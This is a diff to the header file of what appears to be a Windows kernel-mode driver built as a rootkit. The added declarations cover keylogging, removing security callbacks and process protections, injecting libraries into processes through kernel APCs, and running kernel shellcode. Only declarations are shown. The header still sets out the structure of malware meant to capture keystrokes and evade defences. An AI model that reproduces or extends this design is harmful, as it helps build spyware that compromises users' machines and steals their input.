@@ -1,13 +1,10 @@
 #pragma once
 
+#include "ModuleFinder.h"
 #include "RemoveProtections.h"
+#include "Keylogging.h"
 #include "IrpHook.h"
 
-/*
-	General global definitions and macros
-*/
-
-constexpr size_t MAX_KEYSTROKES_TO_SAVE = 8192;
 
 /*
 	Globals used in the project
@@ -32,7 +29,11 @@ struct Globals {
 
 	IrpHookManager* HookManager;
 
-	UCHAR KeystrokeBuffer[MAX_KEYSTROKES_TO_SAVE];
+	Protections::ProtectionRemover* ProtectionRemover;
+
+	Keylogger* Keylogger;
+
+	ModuleFinder* ModuleFinder;
 };
 
 extern Globals g_Globals;
@@ -47,7 +48,21 @@ NTSTATUS IoctlDispatch(PDEVICE_OBJECT, PIRP);
 
 NTSTATUS HandleCopyToMemory(PIRP, PIO_STACK_LOCATION);
 
-NTSTATUS HandleRestoreProtection(PIRP);
+NTSTATUS HandleStartKeylogging(PIRP Irp);
+
+NTSTATUS HandleQueryKeylogging(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation);
+
+NTSTATUS HandleEndKeylogging(PIRP Irp);
+
+NTSTATUS HandleRemoveCallacks(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation);
+
+NTSTATUS HandleInjectLibraryToProcess(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation);
+
+NTSTATUS HandleRunKmShellcode(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation);
+
+NTSTATUS HandleRemoveProtection(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation);
+
+NTSTATUS HandleRestoreProtection(PIRP, PIO_STACK_LOCATION);
 
 NTSTATUS DefaultDispatch(PDEVICE_OBJECT, PIRP);
 
@@ -59,6 +74,6 @@ void OnCreateProcess(HANDLE, HANDLE, BOOLEAN);
 
 void OnCreateThread(HANDLE, HANDLE, BOOLEAN);
 
-void InjectCode(PVOID, PVOID, PVOID);
+void InjectLibraryKernelApc(PVOID, PVOID, PVOID);
 
 NTSTATUS CopyToReadOnlyBuffer(PVOID, const void*, SIZE_T);
